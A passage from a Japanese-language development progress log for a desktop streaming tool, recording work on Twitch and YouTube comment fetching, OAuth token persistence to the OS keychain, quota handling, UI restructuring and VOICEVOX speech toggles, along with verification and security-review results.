  `keyring` crate v3・同期）。sidecar は pure-JS/単一 SEA のまま（native keyring を持ち込まない＝**封じ込めライフサイクル・
  SEA 構成は不変**）。トークンは **sidecar↔Rust の親子 private pipe のみ**を通る＝復元＝Rust→sidecar stdin
  `COMMENT_SIDECAR_RESTORE=`、更新の再保存＝sidecar→Rust stdout `COMMENT_SIDECAR_TOKEN=`／破棄＝`..._TOKEN_CLEAR`。
  Rust はログに出さず keychain のみへ反映。**loopback WS にはトークンを載せない**（従来どおり）。viewer は `link.state`
  フレーム（非機密 bool）で「接続済み/未接続」を表示し、復元済みなら再ログイン不要で取得開始できる。窓の kill-on-close は
  据え置き（再 spawn 時に Rust が keychain から復元注入）。
- **ヘッドレス検証（PASS）**: sidecar typecheck / `build:bundle`（禁止依存アサート＝keyring は sidecar bundle に無い・PASS）/
  host-guard 単体 / smoke（stdin 復元行・stdout token 行を足しても port 受領・ws 接続が壊れない）/ desktop typecheck・lint /
  `cargo check`（keyring v3＋security-framework 解決）。
- **⚠ マージ前**: §9 を変更したため **security-review を再実施**。GUI 検証: 再ログイン不要（窓再オープン／アプリ再起動）・
  logout/失効で keychain クリア・`lsof`/`app_logs`/stdout/stderr に token 非露出（token は private pipe のみ）・Keychain に
  `stream-dock`/`twitch-comment-viewer` エントリ 1 件・実 Twitch コメントの読み上げ・チャンネル復元。

#### 変更ファイル（032c-b′）
- 新規: `apps/desktop/src-tauri/src/comment_sidecar/token_vault.rs`（keychain load/save/clear）、
  `apps/comment-sidecar/src/auth/persisting-token-store.ts`（save/clear→通知）、
  `apps/desktop/src/features/comment-viewer/channelStorage.ts`（localStorage）
- Rust: `Cargo.toml`（`keyring` v3）、`comment_sidecar/mod.rs`（mod 宣言・stdin 復元書込・stdout token/clear→keychain）
- sidecar: `src/index.ts`（onTokenPersist→stdout・stdin 復元リーダ・`sendLinkState`・connection/auth-lost 配線）、
  `src/auth/index.ts`（PersistingTokenStore 配線・`restoreTwitchToken`・`onTokenPersist`）、
  `vendor/gateway/.../websocket-comment.output-port.ts`（`setConnectionHandler`）
- frontend: `commentStream.ts`（`link.state` ハンドラ）、`CommentViewerApp.tsx`（`linked` state・onComments→TTS・
  取得開始で resume・接続済み UI）、`ttsQueue.ts`（suspended ハングガード）
- docs: `docs/security.md`（§9/§10 改訂・032c-b′ 追補記録）、`docs/product.md`、`docs/progress.md`
- 不変: 封じ込めライフサイクル・§1 明示接続・§4 `shell:*` ゼロ・`csp: null`・capability・sidecar 単一 SEA 構成

### 032c-d コメントビューア YouTube コメント取得有効化（OAuth PKCE＋Client Secret 同梱＋gRPC streamList＋クォータ管理・mac 検証可・3 コミット）

032c シリーズ最終。032c-b の Node sidecar 封じ込め基盤（sidecar→localhost WS(17331)→viewer・§1 二層 fail-closed）の上に **YouTube 宛先を
追加解禁**した（新しい通信基盤は作らない）。これで「YouTube と Twitch の両方でずんだもん読み上げ（各サービス個別選択）」のミニマムが完成。
Twitch 経路のロジック・VOICEVOX/TTS・§1 封じ込めフレームは不変（フレーム再利用のみ）。依存前提は 032c-a＋032c-b（ハード依存）。

- **YouTube OAuth ログイン（PKCE＋loopback＋Client Secret 同梱・in-memory）**: osareview の YouTube 認可経路（`adapters/shared/{pkce,state,
  loopback}`＋`adapters/youtube/*`＋config 型）を `apps/comment-sidecar/vendor/auth` へ distill（追加ネット依存無し＝`node:crypto`/`node:http`）。
  `auth/index.ts` に youtube 配線（`assertSupportedProvider` を youtube 許可・`loginStrategyByProvider`/`oauthTokenRefresherByProvider` 登録）。
  新規 `src/youtube-config.ts`＝`PinnedYouTubeOAuthConfigProvider`（endpoint 定数固定＝env override 排除・**Client ID＋Secret を esbuild define で
  焼き込み**）。**YouTube トークンは共有 `PersistingTokenStore` 経由でも in-memory のみ**（persisting-token-store が twitch 以外を通知しない＝
  keyring 永続化しない・§9・Twitch と対比）。generic `login("youtube")` で loopback→code 受領→`oauth2.googleapis.com` で token 交換。
- **同意 URL は Rust opener で host 検証して開く（新設 stdout 行）**: sidecar は `CallbackBrowserLauncher`→`onOpenAuthUrl`→stdout 専用行
  `COMMENT_SIDECAR_OPEN_URL=<url>` で URL を渡す。Rust（`comment_sidecar/mod.rs`）が **host=accounts.google.com を fail-closed 検証**
  （`validate_http_url`＋authority 完全一致・http/port/userinfo/サブドメイン偽装を拒否・Rust ユニットテスト2件 PASS）してから既存
  `tauri-plugin-opener`（IPC 非経由・新規 capability なし）で開く。URL 全体はログに出さず host のみ・`code_verifier` は URL に載らない。
- **gRPC streamList 取得→CommentViewDto 統合→viewer 描画**: osareview の YouTube 取得経路（検出 REST `mine=true`→search→videos→
  `activeLiveChatId`→gRPC streamList・mapper・repos・dto）を `vendor/comment-fetcher` へ取り込み、`app/main.ts` に `createYouTubePipeline`/
  `runYouTubePipeline` 追加（`collectComments` エンジンは provider 非依存で流用）。`start-session(youtube)`→pipeline→`comments.append`
  （既存パス再利用・source:'youtube'）→viewer の `mergeComments`→ずんだもん TTS。event-type マッピングは `wire.ts` で total を確認
  （membership→subscription に畳む＝osareview 準拠・Rust `Membership` variant は当面未使用）。
- **allow-list 二層拡張（fetch ガード＋gRPC チャネルガード新設）**: `host-guard.ts` の `ALLOWED_EXACT_HOSTS` に `oauth2.googleapis.com`
  （token 交換）＋`www.googleapis.com`（REST 検出）を追加（`accounts.google.com` はブラウザ側で fetch には入れない）。**gRPC は fetch/ws を
  通らないため `assertAllowedGrpcTarget` を新設**＝streamList の target を `www.googleapis.com:443` のみに照合（fetch より狭い fail-closed）。
  DI で `guardedStreamListRuntime`（[youtube-grpc-runtime.ts]）を注入し channel 生成前に照合。Data API base URL は定数ピン留め＝二層(a)。
  ユニットテストに Google 宛先・gRPC target host/port・サブドメイン偽装拒否を追加（全 PASS）。
- **クォータ graceful stop（hot-loop しない）**: `QuotaExceededError`＋分類（REST 403 `quotaExceeded` / gRPC `RESOURCE_EXHAUSTED`）を新設。
  osareview の欠陥（全エラーを 1 秒間隔で無限再接続＝クォータをさらに消費）を持ち込まず、枯渇時は**再接続せず停止**して viewer に
  `session.state='failed'`＋理由を通知（クラッシュしない）。通常の切断は従来どおり pageToken 付き再接続。
- **proto-under-SEA（スパイク1）**: proto-loader が単一 SEA 内で `stream_list.proto` を実ファイルとして読めない問題を、proto を**文字列同梱**
  （`stream-list-proto.ts`）→起動時に OS 一時ファイルへ展開→その一時パスを `loadSync` で解決（`import.meta.url` 依存を排除）。api.client.ts を
  注入 runtime（`getProtoPath`/`createClient`）経由に改修。**実 SEA バイナリ起動で `stream_list.proto loadable (spike1 OK)` を確認**。
- **追加依存の理由**: `@grpc/grpc-js`＋`@grpc/proto-loader`（YouTube streamList gRPC ストリーミング・純 JS＝ネイティブアドオン無し・032c-b が
  「YouTube 除外」で落としたものを理由付きで再導入）。SEA 禁止依存アサートから `@grpc/*` を外し、`@napi-rs/keyring`/`@hono/node-server`/
  `dotenv` は引き続き不在を exact 検査で確認。`open`/`googleapis`/`node-fetch` は足さない（Rust opener＋グローバル fetch）。Rust は完全同期のまま。
- **封じ込め検証結果（mac ヘッドレス分）**: `build:sea` で bundle に禁止依存不在・SEA 生成・**postject→codesign `--verify` 通過（スパイク5＝
  gRPC 追加後の再署名 PASS）**。SEA 起動で twitch/youtube DI グラフ解決（decorator metadata 生存）＋proto-under-SEA OK＋ppid self-exit。
  host-guard ユニット（fetch＋gRPC）全 PASS。**実機の `lsof` 封じ込め（Google/YouTube＋gRPC egress が sidecar PID 下のみ・main no-internet）と
  実 YouTube ライブ E2E・クォータ unit 会計は、Google「Desktop app」OAuth クライアント焼き込み＋実配信で mac GUI 実施予定**。
- **security.md/product.md 改訂＋security-review**: security.md に §1「例外（032c-d…）」追加＋032c-c/032c-b の forward-ref 更新、§4（Rust opener で
  host 検証）・§9（YouTube トークン in-memory）・§10（@grpc/* 再導入の理由）・「## コメントビューア方針」①④拡張＋**新規⑧**（Client Secret 同梱の
  根拠・consent screen 本番公開運用前提・クォータ）・032c-d security-review 記録を追記。product.md にクォータ記録。**security-review スキルを
  適用し判定＝問題なし**（修正必須なし。後回し＝loopback OAuth サーバは state＋PKCE で保護・実機 E2E は要 OAuth クライアント）。
- **実機スパイク 5 件の結果**: ①**proto-under-SEA＝PASS**（文字列同梱→一時展開→loadSync・SEA 起動で確認）②gRPC 封じ込め＝ガードのユニット
  拒否は PASS・**実 lsof egress は実機 E2E**③クォータ unit 会計＝**実ライブで実測予定**（会計は product.md へ）④OAuth 運用＝consent 本番公開の
  要否・refresh_token 7 日失効を docs 明記⑤**SEA 再署名＝PASS**（gRPC 追加後も codesign 通過）。
- **Google Cloud 用意状況（着手前確認）**: ✅ Data API v3 有効化・✅ 実ライブ配信を用意可／⬜ Desktop app OAuth クライアント（Client ID/Secret）
  未作成→OAuth E2E は焼き込み後・⬜ consent 本番公開 未実施→テストモードだと refresh_token 7 日失効（docs 明記）。
- **3 コミット構成**: ①YouTube OAuth ログイン→token 取得（vendor 認可経路・in-memory・youtube-config 焼き込み・ControlFrame service 拡張・
  `COMMENT_SIDECAR_OPEN_URL`→Rust opener host 検証・viewer YouTube ログイン UI／proto-under-SEA gate 先行確認）②streamList 取得→CommentViewDto→
  描画（@grpc 再導入・proto 同梱・start-session(youtube)→pipeline・gRPC チャネルガード・クォータ graceful stop・取得開始/停止 UI）
  ③docs 改訂＋security-review。
- **検証（mac で完結）**: `pnpm --filter @stream-dock/comment-sidecar typecheck`／`pnpm --filter ./apps/desktop typecheck`／`lint`／`cargo check`＋
  Rust host 検証ユニット2件／`build:sea`（proto-under-SEA・codesign）／host-guard ユニット（fetch＋gRPC）すべて pass。`check:bindings` drift ゼロ
  （Rust model 不変）。**既存 drift（別件）**: `rakuraku/bindings/ScanResult.ts` は 032c-b/-c 同様 revert し混入させていない。

#### 変更ファイル（032c-d）
- 新規（sidecar）: `src/youtube-config.ts`（Pinned OAuth/Data API config・ID/Secret 焼き込み）、`src/auth/callback-browser-launcher.ts`、
  `src/comment-fetcher/{register-youtube-deps,youtube-grpc-runtime}.ts`、`vendor/auth/src/adapters/{shared/{pkce,state,loopback},youtube/*}`＋
  `infrastructure/youtube/config/oauth-config.ts`（distill）、`vendor/comment-fetcher/src/adapters/{youtube/*,shared/quota/error.ts}`＋
  `adapters/youtube/client/stream-list-proto.ts`（proto 文字列同梱）＋`infrastructure/youtube/config/*`＋`usecases/comment-collection/youtube/*`（distill）
- 変更（sidecar）: `src/index.ts`（ControlFrame service・platform 別 session/link state・startYouTubeLogin/Session・onOpenAuthUrl→stdout・
  registerYouTubeDependencies・proto self-check）、`src/host-guard.ts`（Google 宛先＋`assertAllowedGrpcTarget`）、`src/auth/index.ts`（youtube 配線）、
  `src/comment-fetcher/index.ts`（barrel）、`vendor/comment-fetcher/src/app/main.ts`（YouTube pipeline＋quota FAILED 分岐）、
  `vendor/comment-fetcher/src/adapters/youtube/client/{api,live-stream}.client.ts`（SEA proto＋gRPC guard／403 quota）、
  `.../usecases/comment-collection/youtube/collect-comments.usecase.ts`（quota graceful stop）、`scripts/{build-sea,test-host-guard}.mjs`、`package.json`（@grpc/*）
- 変更（Rust）: `src-tauri/src/comment_sidecar/mod.rs`（`OPEN_URL_PREFIX` アーム＋`open_consent_url`＝host=accounts.google.com 検証・ユニットテスト）
- 変更（frontend）: `features/comment-viewer/commentStream.ts`（service 付き startLogin/startSession/stopSession・platform 分岐）、
  `screens/comment-viewer/CommentViewerApp.tsx`（＋`.module.css`・YouTube パネル併存・取得開始/停止）
- docs: `docs/security.md`／`docs/product.md`／`docs/task-board.md`／`docs/progress.md`
- 不変（確認済み）: Twitch 経路ロジック・VOICEVOX/TTS・Node sidecar 基盤/viewer WS/§1 封じ込めフレーム・`capabilities/*`（`shell:*` ゼロ）・
  `tauri.conf.json`（`csp: null`）・Rust の同期性（async/WS/HTTP crate 不追加）・ts-rs `CommentViewDto`（drift ゼロ）・`token_vault`（Twitch 用のまま）

## 2026-07-19 (032c-d′/″/‴ YouTube ログイン永続化＋取得継続性/観測性＋クォータ削減)

### 完了したこと

- **032c-d′ ログイン永続化（§9 ポリシー変更・再 security-review 済み）**: YouTube ログインを Twitch と同型に **OS キーチェーンへ永続化**する
  （従来は in-memory のみ）。既存の Twitch 永続化パイプ（sidecar↔Rust 親子 private pipe）を **provider 対応へ一般化**。`token_vault` に
  `account_for(provider)`（`twitch`→`twitch-comment-viewer` / `youtube`→`youtube-comment-viewer` / **その他→None＝fail-closed**）を新設し
  `entry/load/save/clear` を provider 引数化。private pipe プロトコルを provider 付きへ拡張（保存 `COMMENT_SIDECAR_TOKEN=<provider> <json>` /
  破棄 `..._TOKEN_CLEAR=<provider>` / 復元 `COMMENT_SIDECAR_RESTORE=<provider> <json>`）。sidecar 側も `=== "twitch"|"youtube"` の厳格判定＋
  `assertSupportedProvider`。**永続対象は TokenSetPlain（access/refresh/expiry/scope）のみ**で code_verifier/Client Secret は非永続。restore は
  onPersist を呼ばず書き戻さない。**新規 crate/npm・宛先・スコープ・capability・CSP・binding は不変**。
- **032c-d″ 取得継続性の修正＋観測性**: 実ライブで出た「取得開始→数秒で待機」バグを修正。`retryOnStreamEnd` を開始時再検出フラグ
  （`retryOnLiveStreamNotFound`）から**分離**（YouTube=true で nextPageToken 再接続・継続取得／Twitch=false 不変）。配信終了監視を
  `search.list`(100u・遅延) から `videos.list`(by-id・1u・整合) へ置換。sidecar の診断 **stderr を Rust stderr へ透過**（従来は握りつぶし）。
  token/secret は §9 で stderr に載せない設計のため非露出（grep 再確認済み）。
- **032c-d‴ クォータ削減**: 検出を `search.list`(100u) → `liveBroadcasts.list`(broadcastStatus=active・1u・即時整合) へ置換。配信終了監視を
  **silence-gated（無言監視）**化＝コメントが流れている間（直近受信から 90s 未満）は videos.list を叩かず（活発時 ~0u）、無言時のみ 45s ごとに
  生存確認し連続 2 miss で終了確定（検知遅延 典型 ~135s／最悪 ~180s＝設計許容）。一時エラーは inconclusive（miss 非加算・誤終了防止）、
  QuotaExceededError は即 rethrow→FAILED。宛先 `www.googleapis.com`・スコープ `youtube.readonly` 不変（再同意不要）。

### レビュー / 検証

- **security-review／code-review(effort high) 実施＝問題なし**（致命的な指摘なし）。§9 永続化の核心（TokenSetPlain のみ・private pipe のみ・
  非ログ・provider 別 fail-closed・restore 非書き戻し・logout/失効で確実クリア）と §1 不変（宛先/スコープ/gRPC チャネルガード/依存/capability/CSP
  差分ゼロ）を確認。stderr 透過後の `console.*` に token/secret を載せる箇所ゼロ（gRPC ServiceError は応答 metadata で Authorization 非含有）。
- **ヘッドレス検証 PASS**: `pnpm --filter @stream-dock/comment-sidecar typecheck` / `pnpm --filter ./apps/desktop typecheck` / `lint` /
  `cargo check` / `node apps/comment-sidecar/scripts/test-host-guard.mjs`（16 ケース PASS）。binding drift ゼロ。
- **残課題（実機）**: GUI E2E（再ログイン不要・logout/失効で keychain クリア・token 非露出）／テストモード consent の refresh_token 7 日失効／
  gRPC streamList 実クォータ計測。テスト網（*.test.ts）がリポジトリに無いため回帰は typecheck/lint/cargo check＋実機 GUI に依存。

### 変更ファイル（032c-d′/″/‴）

- Rust: `src-tauri/src/comment_sidecar/{token_vault.rs（provider 一般化）,mod.rs（private pipe provider 化＋stderr 透過）}`
- sidecar(app): `src/index.ts`（provider 付きプロトコル・厳格判定）、`src/auth/index.ts`（`restoreToken(provider,…)`）、
  `src/auth/persisting-token-store.ts`（twitch 限定撤去・provider 付き通知）
- sidecar(vendored comment-fetcher): `src/app/main.ts`（retryOnStreamEnd 分離・silence-gated 監視）、
  `src/adapters/youtube/client/live-stream.client.ts`（findActiveOwnBroadcast＝liveBroadcasts・isLiveStreamActive＝videos.list）、
  `src/adapters/youtube/dto/live-stream.dto.ts`（liveBroadcasts DTO 追加・search DTO 削除）
- frontend: `screens/comment-viewer/CommentViewerApp.tsx`（コメントのみ・ロジック不変）
- docs: `docs/security.md`（§9 更新＋追補 032c-d′/″/‴＋旧判定に再レビュー注記）／`docs/product.md`（検出/監視/枯渇の記述更新）／
  `docs/tasks/032c-d-youtube-comments.md`（keyring 永続化=対象外 の記述を 032c-d′ 方針変更へ追記）／`docs/task-board.md`／`docs/progress.md`
- 不変（確認済み）: `capabilities/*`・`tauri.conf.json`（`csp: null`）・`Cargo.toml`/`Cargo.lock`・`package.json`/`pnpm-lock.yaml`（新規 crate/npm ゼロ）・
  gRPC チャネルガード（`www.googleapis.com:443`）・OAuth スコープ（`youtube.readonly`）・ts-rs binding（新規 command なし）

## 2026-07-19 (033a コメビュ本体の軽量化・レイアウト整理)

### 完了したこと

- **033a（問題 1,2,3,5 のみ／純粋な frontend 整理＋窓サイズ数値変更）**: 検証用の UI を撤去し、窓を実運用サイズへ拡大した。
  機能配線（Twitch/YouTube 取得・VOICEVOX 読み上げ・sidecar）と Rust command ロジックは不変。接続 UI（→033b）・VOICEVOX
  バナー/クレジット（→033c）は**残置**。
- **(1) ヘッダー削除**: `<header>`（`<h1>コメントビューア</h1>` ＋ 総数 span）を丸ごと除去。OS 窓タイトル（`lib.rs` の
  `.title("コメントビューア")`）と重複のため冗長。
- **(2) 総数を一覧右上へ移設**: `<ol>` 直上に `listHeader` 行を新設し `{comments.length} 件` を右寄せ表示（`justify-content:flex-end`）。
  文言「件」踏襲・`.count` を移設先で再利用。
- **(3) モック撤去**: toolbar（モック追加/クリア/読み上げテスト）と検証専用の `SEED_COMMENTS`/`makeMock`/`seqRef`/`testSpeak`/
  `addMock`/`clearAll` を削除。初期表示を空配列（`useState<CommentViewDto[]>([])`）にし、空状態は既存「コメントはまだありません」を活用。
  **`mergeComments`／`enqueueForSpeech` は実データ経路（`onComments`）で使用中のため残置**。未使用 import は発生せず（`useRef` は
  `ttsRef`/`streamRef` で継続使用）。ファイル冒頭 JSDoc の stale 表現「frontend 専用モック `CommentViewDto` を最小描画」（032c-b/-d の
  実データ配線後から残っていた既存記述）を「受信コメント（`CommentViewDto`）を最小描画」へ訂正し、モック撤去後の記述整合を取った。
- **(4) 窓サイズ拡大（縦長→横広）**: `lib.rs` の `inner_size(420,640)→(960,720)` / `min_inner_size(320,400)→(560,520)`。
  `open_comment_viewer_window` のロジック（sidecar 連動・単一インスタンスガード・窓イベント）は不変、引数値のみ変更。**実値は実機 tauri dev で
  目視微調整して確定予定**（本コミットは提案値 960×720 / 560×520）。

### レビュー / 検証

- **ヘッドレス検証 PASS**: `pnpm --filter ./apps/desktop typecheck` / `lint` / `cargo check`（`src-tauri`）いずれもエラーなし。
- **自己確認**: `*.module.css` に生 hex/rgba なし（すべて `var(--...)` 経由）。残置要素（接続 UI・VOICEVOX バナー・クレジット）への
  diff 変更行ゼロ（無傷）。CSS は `.header`/`.title`/`.toolbar` を削除し `.listHeader` を追加、`.count`（移設先で再利用）・`.note`
  （YouTube パネルで継続使用）は残置。
- **残課題（実機）**: `pnpm --filter ./apps/desktop tauri dev` で ①タイトル削除 ②総数の右上表示 ③モック撤去＋初期空表示 ④横広サイズ
  ⑤Twitch/YouTube 取得・VOICEVOX 読み上げの退行なし、を目視確認。窓サイズ実値はここで確定する。

### 変更ファイル（033a）

- frontend: `screens/comment-viewer/CommentViewerApp.tsx`（ヘッダー撤去・総数移設・モック/検証コード削除・初期値空配列）、
  `screens/comment-viewer/CommentViewerApp.module.css`（`.header`/`.title`/`.toolbar` 削除・`.listHeader` 追加）
- Rust: `src-tauri/src/lib.rs`（`open_comment_viewer_window` の `inner_size`/`min_inner_size` 引数値のみ）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: Tauri command 表面・`capabilities/*`・`tauri.conf.json`（`csp: null`）・依存（`Cargo.toml`/`package.json`／新規 crate/npm
  ゼロ）・データ取得/TTS/sidecar ロジック・接続 UI/VOICEVOX バナー/クレジットの残置要素

## 2026-07-19 (033b 設定ビュー新設＋接続UI移設＋接続状態インジケータ)

### 完了したこと

- **033b（問題 4／UI 再構成のみ・通信面不変）**: Twitch/YouTube の接続操作をコメビュ窓内の「設定ビュー」へ移設して本体をすっきりさせ、
  本体には接続ボタンの代わりに「円アイコン色＋テキスト」の接続状態インジケータを置いた。**新しい WS・宛先・sidecar・Tauri
  command・capability・依存は一切足していない**（UI の置き換えに徹する）。
- **(1) ビュー切替（comment / settings）**: `CommentViewerApp` に `view: "comment" | "settings"` state を追加。comment ビュー
  上部の小さなツールバー（`.toolbar`）右端に**歯車ボタン**（`⚙`・`aria-label="設定"`・既存 Sidebar の `✎`/`×` と同じ文字グリフ方式＝
  アイコン依存を足さない）で `settings` へ、設定ビュー先頭の**戻るボタン**（`←`）で `comment` へ戻る。**切替は描画のみ**で、state・
  WS・TTS は本体に残るため、設定表示中もコメント受信・蓄積は継続し（WS は窓内 1 本のまま）本体へ戻れば全件が並ぶ。
- **(2) 接続 UI を設定ビューへ移設**: Twitch パネル・YouTube パネル・Device Code 提示を新規 `SettingsView` へ移動。既存 state・
  ハンドラ（`handleTwitchConnect`/`handleStartSession`/`handleStopSession`/`handleYouTubeConnect`/`handleYouTubeStartSession`/
  `handleYouTubeStopSession`）・制御フレーム（`startLogin`/`startSession`/`stopSession`）を**props で渡してそのまま再利用**（新規 WS/
  宛先/sidecar なし）。`streamConnected===false` の間「コメント取得プロセスに接続中…」を優先表示する配慮、YouTube の
  `!youtubeLinked && connecting` →「ブラウザで同意してください…」表示、`channel.trim()` ガードも踏襲。`SESSION_STATE_LABEL`
  （待機/接続中/取得中/失敗）は `SettingsView` へ移動。
- **(3) 接続状態インジケータ（`StatusIndicator`）**: comment ビューのツールバー左に配置。**サービス別 2 行**（Twitch / YouTube）で、
  各行 = 色付き円＋サービス名＋状態ラベル。色対応＝**未接続=灰(--muted) / 接続中=黄(--warn) / 接続済み=青(--primary) /
  取得中=緑(--ok) / 失敗=赤(--danger)**（全て role トークン経由・生 hex なし）。導出は純関数 `deriveConnectionStatus(streamConnected,
  linked, sessionState)`（失敗 > sidecar 準備中/接続中 > 取得中 > 接続済み待機 > 未接続）。**サービスごとに独立導出**で相互参照や
  「取得中を 1 つだけ優先」ロジックを持たないため、将来 Twitch/YouTube の**併存・同時取得**が前提になっても両行が同時に「取得中」を
  表示でき UI 変更不要（ユーザー要望「後々併存・同時取得前提になってもそのまま使えるUI」を反映）。
- **(4) コンポーネント分割**: 442 行の `CommentViewerApp` から `SettingsView` / `StatusIndicator` / `CommentList` を切り出し（配置は
  既存慣習どおり `screens/comment-viewer/` に co-locate＝React 表示、`features/comment-viewer/` は非 React ロジック専用）。
  **state は全て `CommentViewerApp` に残し props で受け渡す**。**WS 接続 useEffect は分割せず窓内 1 本のまま**。`SOURCE_LABEL`/
  `SOURCE_CLASS` は `CommentList` へ移動。VOICEVOX の engineBanner・credit は線引きどおり comment ビューに残置（→033c）。
- **CSS 方針**: 既存 `CommentViewerApp.module.css` を 3 コンポーネントで共有 import（`.btn`/`.btnGhost`/`.status` を移動・複製せず
  既存クラスの diff をほぼ 0 に）。追加クラス＝`.toolbar`/`.iconBtn`/`.statusIndicator`/`.statusRow`/`.statusDot`＋状態別
  `.dotDisconnected`/`.dotConnecting`/`.dotConnected`/`.dotFetching`/`.dotFailed`/`.statusService`/`.statusLabel`/`.settingsView`/
  `.settingsHeader`/`.settingsTitle`。削除クラスなし。
- **lint 微調整**: `deriveConnectionStatus`／`ConnectionStatus` 型は `StatusIndicator.tsx` 内 file-local に留めた（他所未参照のため。
  export すると `react-refresh/only-export-components` 警告が出るため）。将来バレ derive が必要になった時点で切り出す。

### レビュー / 検証

- **security-review 実施＝問題なし**（修正必須ゼロ）。①複数 WS を張っていない（`connectCommentStream` の useEffect は本体 1 箇所・
  `new WebSocket` は `commentStream.ts` の `ws://127.0.0.1:<port>` のみ）②設定をメイン窓へ漏らしていない（変更は全て
  `screens/comment-viewer/` 配下・`App.tsx`/`SettingsScreen`/main features に差分ゼロ＝main no-internet 維持）③新規 command/
  capability/依存なし（`capabilities/*`・`tauri.conf.json`〈`csp:null`〉・`Cargo.*`・`package.json`・`pnpm-lock.yaml` に差分ゼロ）。
  新規 3 ファイルは表示専用で invoke/fetch/WebSocket/console/shell を持たない。コメント本文のログ/DB 出力も増やしていない。
- **ヘッドレス検証 PASS**: `pnpm --filter ./apps/desktop typecheck` / `lint`（0 error / 0 warning）いずれもエラーなし。
  `*.module.css` に生 hex/rgba なし（追加クラスはすべて `var(--...)`）。
- **残課題（実機）**: `pnpm --filter ./apps/desktop tauri dev` で ①歯車→設定ビュー切替／接続・取得開始/停止・Device Code 提示が
  設定側で完結 ②本体に接続ボタンが無く円アイコン色＋テキストで Twitch/YouTube の状態が分かる ③設定表示中もコメント受信が継続し
  戻ると全件表示（退行なし）、を目視確認。no-internet は `lsof -i` で外部 ESTABLISHED が sidecar PID 下のみ・main 本体 PID に
  出ないことを確認。

### 変更ファイル（033b）

- frontend（変更）: `screens/comment-viewer/CommentViewerApp.tsx`（`view` state・ツールバー＋StatusIndicator 追加・接続UI/一覧を
  新コンポーネントへ委譲・接続系ハンドラは維持し props で受け渡し。WS useEffect・VOICEVOX ロジック・credit は不変）、
  `screens/comment-viewer/CommentViewerApp.module.css`（上記クラスを追加のみ）
- frontend（新規）: `screens/comment-viewer/SettingsView.tsx`（接続UI 移設）、`StatusIndicator.tsx`（状態インジケータ＋
  `deriveConnectionStatus`）、`CommentList.tsx`（listHeader 総数＋一覧・`SOURCE_LABEL`/`SOURCE_CLASS`）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `commentStream.ts`（制御フレーム・WS）・Node sidecar・`lib.rs`/Rust command 表面・`capabilities/*`・
  `tauri.conf.json`（`csp: null`）・依存（`Cargo.toml`/`package.json`/`pnpm-lock.yaml`／新規 crate/npm ゼロ）・接続フロー（OAuth/
  Device Code/gRPC）

## 2026-07-19 (033c VOICEVOX 読み上げトグル＋クレジット条件表示＋自動起動/自動連携)

親 [033](tasks/033-comment-viewer-ux-revamp.md) の問題 6,7 に対応。VOICEVOX 読み上げを **ON/OFF トグル化**（既定 OFF）し、
**ON のときだけ読み上げ・ON のときだけクレジット**を出すようにした。加えて **自動連携トグル**（ON で窓オープン時に自動起動）と
**読み上げ ON かつ ENGINE 未起動での自動起動**を追加。起動は既存 `launch_voicevox_engine` 経路を再利用し、「呼ぶ契機」だけを増やした。

### 実装内容

- **(1) トグル永続化（新規 `features/comment-viewer/ttsPrefs.ts`）**: `channelStorage.ts`/`tutorial/tutorialStorage.ts` の boolean 規約
  （文字列 `"true"` 保存・`=== "true"` 判定・既定 false・`try/catch` 握りつぶし）に倣う。キー＝`stream-dock.comment-viewer.tts-enabled`
  （読み上げ ON/OFF）と `stream-dock.comment-viewer.voicevox-autolink`（自動連携 ON/OFF）。どちらも**既定 OFF**・非機密の UI 値のみ。
- **(2) 読み上げゲート**: `enqueueForSpeech` を **`ttsEnabledRef.current` で OFF 時 no-op** 化。トグル state を直接 `useCallback` 依存に
  入れると WS 接続 effect（`enqueueForSpeech` を依存に持つ）が張り直され「窓内 1 本」原則に反するため、**ref 経由**で参照し
  `useCallback([])` の安定を維持（＝WS は 1 本のまま）。OFF 中のコメントは `ttsQueue` の `seenIds` に載らず、後で ON にしても遡らない。
- **(3) 自動起動の一本化 `launchEngine`**: 旧 `handleLaunch` を唯一の起動入口 `launchEngine`（`useCallback([])`）へ整理。**二重 spawn を
  3 段で抑止**＝①`launchInFlightRef`（最初の await 前に立てる同期ガード・同一 tick/並行を 1 回に）②`launchRequestedRef`（起動成功後〜
  稼働確認/`LAUNCH_GRACE_MS` 猶予の窓）③`engineRunningRef`（稼働中なら起動しない）。ガードはすべて ref で最新値を読む。
  Rust command・引数・経路は不変。契機は (A) `useEffect([ttsEnabled, engineRunning, launchEngine])` で「読み上げ ON かつ engineRunning
  ===false」（トグル ON も engine 落ち検知も拾う／初期 null では空振りしない）、(B) マウント時 `loadVoicevoxAutolink()` 直読みで
  「窓オープン時 1 回」、(C) バナー手動ボタン（同じ `launchEngine`）。
- **(4) 二重発火なし（両方 ON）**: マウント時 `engineRunning` は null のため (A) は発火せず (B) が先に `launchInFlightRef` を立てる。以降
  (A) がポーリング後に発火してもガードに阻まれ **spawn は 1 回**。StrictMode 二重実行も同ガードが吸収。
- **(5) 起動バナー整理（重複導線にしない）**: 表示条件を `engineRunning===false` → **`ttsEnabled && engineRunning===false`** に変更
  （OFF の人には出さない）。ボタンは同じ `launchEngine` を叩く再試行/未登録誘導のフォールバック（通常は `launchRequested` で
  「起動中…」disabled、未登録・失敗時のみ押せる）。`launchNotice`（未登録の登録誘導文言）は従来どおりバナー内表示。
- **(6) クレジット移設**: 本体コメントビューの**常時表示 `<section>` を削除**し、`SettingsView` の**読み上げトグル直下・`ttsEnabled` 時のみ**
  へ移動。`CREDIT_NOTICE` 定数は唯一の描画元 `SettingsView.tsx` へ移した（文言・URL・CSS クラス据え置き・静的テキスト・外部通信なし）。
- **(7) トグル UI**: 再利用可能な Switch 部品は既存になかったため、`SettingsView` 内に file-local な `ToggleSwitch`（`role="switch"`
  `aria-checked`・テーマ設定の radio パターンに倣う）を新設。ラベルは先取りで **「VOICEVOX読み上げ」**／**「VOICEVOX自動連携」**
  （全面改名は 033d）。CSS は `CommentViewerApp.module.css` に `.voicevoxPanel`/`.toggleRow`/`.toggleLabel`/`.switch`/`.switchOn`/`.knob`
  を追加（OFF=`--control-bg`/ON=`--primary-soft`・生 hex なし）。`.credit` 系クラスは流用（削除・改名なし）。

### 検証

- `pnpm --filter ./apps/desktop typecheck` / `lint` いずれも **0 error / 0 warning**（`git diff --stat`＝3 変更＋1 新規 / +224）。
- 自己確認: ① `launchVoicevoxEngine()` は従来どおり引数なし `invoke("launch_voicevox_engine")` ＝経路・引数不変 ② 新規 Tauri command/
